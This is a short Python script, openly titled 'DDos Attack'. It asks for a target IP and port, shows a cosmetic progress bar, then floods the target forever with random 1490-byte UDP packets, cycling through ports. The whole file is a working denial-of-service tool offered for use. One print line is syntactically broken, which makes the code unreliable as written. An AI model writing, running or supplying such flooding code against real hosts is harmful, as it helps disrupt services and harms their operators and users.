import os
import time
import socket
import random
from datetime import datetime
from colorama import init, Fore

init()  # Initialiser colorama

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet DDos Attack")
print(Fore.GREEN + "Author   : nobodyy78364")
print("You Tube : IN CONTRUCTION")
print("github   : IN CONTRUCTION")
print("Facebook : IN CONTRUCTION")

ip = input(Fore.YELLOW + "IP Target: ")
port = int(input("Port: "))

os.system("clear")
os.system("figlet Attack Starting")
print(Fore.LIGHTRED_EX + "[===============] 0% ")
time.sleep(1)
print("[====================] 25%")
time.sleep(1)
print(Fore.LIGHTHGREEN_EX"[=========================] 50%")
time.sleep(1)
print(Fore.LIGHTBLUE_EX + "[==============================] 100%")
time.sleep(2)

sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print(Fore.LIGHTMAGENTA_EX + "Sent {} packet to {} through port: {}".format(sent, ip, port))
    if port == 65534:
        port = 1
